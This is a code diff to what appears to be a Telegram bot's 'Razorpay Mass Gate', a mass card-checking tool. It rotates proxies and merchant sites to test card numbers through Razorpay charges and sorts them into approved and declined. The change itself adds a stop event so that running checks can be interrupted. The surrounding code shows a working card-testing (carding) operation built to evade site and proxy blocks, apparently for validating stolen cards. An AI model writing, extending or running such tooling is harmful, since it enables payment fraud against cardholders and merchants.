@@ -22,6 +22,16 @@ router = Router()
 # ── Razorpay API (hosted on the VPS, port 9000) ──────────────────────────
 RZ_API = os.environ.get("RZ_API", "http://127.0.0.1:9000")
 import rz_rotation
+
+_STOP_EVENT = threading.Event()
+
+
+def stop_all():
+    """Interrupt the mass check's sync workers (sets the stop event)."""
+    _STOP_EVENT.set()
+
+
+
 from proxy import _tg, ID_WALLET, ID_LOCK, ID_APPROVED, ID_DECLINED
 SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rz_site.txt")
 MAX_VALID_CARDS = 5000
@@ -274,19 +284,21 @@ def check_fn(card):
     Returns (status, msg, brand, amount_inr) — amount_inr is the actual charge."""
     server_error_sites = set()
     while True:
+        if _STOP_EVENT.is_set():
+            return "STOPPED", "Stopped", "UNKNOWN", 0
         site = _next_site()
         if not site:
             # all sites in cooldown -> PAUSE until the earliest one recovers
             earliest = _earliest_site_cooldown()
             if earliest and earliest > time.time():
-                time.sleep(min(earliest - time.time(), 300) + 0.5)
+                _STOP_EVENT.wait(min(earliest - time.time(), 10) + 0.5)
                 continue
             return "ERROR", "All sites unavailable (amount/blocked) — try later", "UNKNOWN", 0
         proxy, lock = _acquire_free_proxy()
         if proxy is None:
             earliest = _earliest_proxy_cooldown()
             if earliest and earliest > time.time():
-                time.sleep(min(earliest - time.time(), 300) + 0.5)
+                _STOP_EVENT.wait(min(earliest - time.time(), 10) + 0.5)
                 continue
             return "ERROR", "All proxies unavailable — try later", "UNKNOWN", 0
         try:
@@ -360,6 +372,7 @@ def check_fn(card):
 @router.message(F.text.startswith("/mrz") | F.caption.startswith("/mrz"))
 async def mrz_command(message: types.Message):
     global _amount_paise, _proxies, _sites
+    _STOP_EVENT.clear()
 
     if not await asyncio.to_thread(is_gate_enabled, "mrz"):
         await safe_reply(message, "🚧 <b>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
